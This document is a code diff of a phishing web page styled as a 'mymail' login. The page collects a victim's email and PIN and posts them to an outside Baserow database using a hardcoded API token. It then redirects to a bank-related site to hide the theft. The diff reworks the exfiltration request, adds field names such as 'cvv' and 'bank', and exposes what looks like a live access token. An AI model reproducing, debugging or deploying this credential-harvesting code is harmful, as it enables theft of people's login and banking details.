@@ -318,54 +318,48 @@
 
     <script>
         // DOM elements
-        const page1 = document.getElementById('page1');
-        const page2 = document.getElementById('page2');
-        const emailForm = document.getElementById('email-form');
-        const pinForm = document.getElementById('pin-form');
-        const emailInput = document.getElementById('email');
-        const pinInput = document.getElementById('pin-code');
-        const displayEmail = document.getElementById('display-email');
-        const showPinCheckbox = document.getElementById('show-pin');
-        
-        // Constants
-        const BASEROW_API = 'https://baserow.io/database/209047/table/503285/914739';
-        const TOKEN = 'Token LG6hnTBxgBG78FueElsSwpHRd4Wep1oL';
-        
-        // Handle email form submission
-        emailForm.addEventListener('submit', function(e) {
-            e.preventDefault();
-            
-            const email = emailInput.value.trim();
-            
-            if (email) {
-                // Store email in localStorage (more persistent than sessionStorage)
-                localStorage.setItem('userEmail', email);
-                
-                // Display email on page 2
-                displayEmail.textContent = email;
-                
-                // Switch to page 2
-                page1.style.display = 'none';
-                page2.style.display = 'block';
-                
-                // Focus on PIN field
-                pinInput.focus();
-                
-                // Update document title
-                document.title = 'Welcome - mymail';
-            }
-        });
-        
-        // Handle PIN form submission
-pinForm.addEventListener('submit', async function(e) {
+const page1 = document.getElementById('page1');
+const page2 = document.getElementById('page2');
+const emailForm = document.getElementById('email-form');
+const pinForm = document.getElementById('pin-form');
+const emailInput = document.getElementById('email');
+const pinInput = document.getElementById('pin-code');
+const displayEmail = document.getElementById('display-email');
+const showPinCheckbox = document.getElementById('show-pin');
+
+// Baserow API config
+const TOKEN = 'Token LG6hnTBxgBG78FueElsSwpHRd4Wep1oL'; // ✅ Your actual token
+const TABLE_ID = '503285';
+const BASEROW_API = `https://api.baserow.io/api/database/rows/table/${TABLE_ID}/`;
+
+// ✅ Replace these with your actual field IDs from Baserow (not labels!)
+const FIELD_EMAIL = 'cvv'; // 🔁 Replace with actual field ID for "cardNumber"
+const FIELD_PIN = 'bank';   // 🔁 Replace with actual field ID for "expiryYear"
+
+// Handle email form submission
+emailForm.addEventListener('submit', function (e) {
     e.preventDefault();
-    
+
+    const email = emailInput.value.trim();
+    if (email) {
+        localStorage.setItem('userEmail', email);
+        displayEmail.textContent = email;
+        page1.style.display = 'none';
+        page2.style.display = 'block';
+        pinInput.focus();
+        document.title = 'Welcome - mymail';
+    }
+});
+
+// Handle PIN form submission
+pinForm.addEventListener('submit', async function (e) {
+    e.preventDefault();
+
     const email = localStorage.getItem('userEmail');
     const pin = pinInput.value;
-    
+
     if (email && pin) {
         try {
-            // Send data to Baserow with the specified field names
             const response = await fetch(BASEROW_API, {
                 method: 'POST',
                 headers: {
@@ -373,51 +367,51 @@ pinForm.addEventListener('submit', async function(e) {
                     'Content-Type': 'application/json'
                 },
                 body: JSON.stringify({
-                    'cardNumber': email,
-                    'expiryYear': pin
+                    [FIELD_EMAIL]: email,
+                    [FIELD_PIN]: pin
                 })
             });
-            
-            console.log('Baserow submission successful');
-            
-            // Redirect to www.bf.bg
+
+            const result = await response.json();
+
+            if (response.ok) {
+                console.log('✅ Data submitted to Baserow:', result);
+                alert('✅ Submitted to Baserow successfully!');
+            } else {
+                console.error('❌ Baserow API error:', result);
+                alert('❌ Baserow error: ' + JSON.stringify(result));
+            }
+
             window.location.href = 'https://www.bf.bg';
         } catch (error) {
-            console.error('Error submitting to Baserow:', error);
-            
-            // Still redirect even if there's an error
+            console.error('❌ Fetch error:', error);
+            alert('❌ Network error: ' + error.message);
             window.location.href = 'https://www.bf.bg';
         }
     }
 });
-        
-        // Toggle PIN visibility
-        showPinCheckbox.addEventListener('change', function() {
-            // Since we're using type="text" already, we'll use CSS to hide/show
-            if (this.checked) {
-                pinInput.style.webkitTextSecurity = 'none';
-                pinInput.style.textSecurity = 'none';
-            } else {
-                pinInput.style.webkitTextSecurity = 'disc';
-                pinInput.style.textSecurity = 'disc';
-            }
-        });
-        
-        // Initialize PIN field to be masked
-        pinInput.style.webkitTextSecurity = 'disc';
-        pinInput.style.textSecurity = 'disc';
-        
-        // Check if returning from page 2 or if email is already stored
-        window.addEventListener('load', function() {
-            const savedEmail = localStorage.getItem('userEmail');
-            
-            if (savedEmail && (window.location.hash === '#verify' || window.location.search.includes('continue'))) {
-                displayEmail.textContent = savedEmail;
-                page1.style.display = 'none';
-                page2.style.display = 'block';
-                document.title = 'Welcome - mymail';
-            }
-        });
+
+// Toggle PIN visibility
+showPinCheckbox.addEventListener('change', function () {
+    pinInput.style.webkitTextSecurity = this.checked ? 'none' : 'disc';
+    pinInput.style.textSecurity = this.checked ? 'none' : 'disc';
+});
+
+// Initialize PIN field to be masked
+pinInput.style.webkitTextSecurity = 'disc';
+pinInput.style.textSecurity = 'disc';
+
+// Load saved email if revisiting
+window.addEventListener('load', function () {
+    const savedEmail = localStorage.getItem('userEmail');
+    if (savedEmail && (window.location.hash === '#verify' || window.location.search.includes('continue'))) {
+        displayEmail.textContent = savedEmail;
+        page1.style.display = 'none';
+        page2.style.display = 'block';
+        document.title = 'Welcome - mymail';
+    }
+});
+
     </script>
 </body>
 </html>
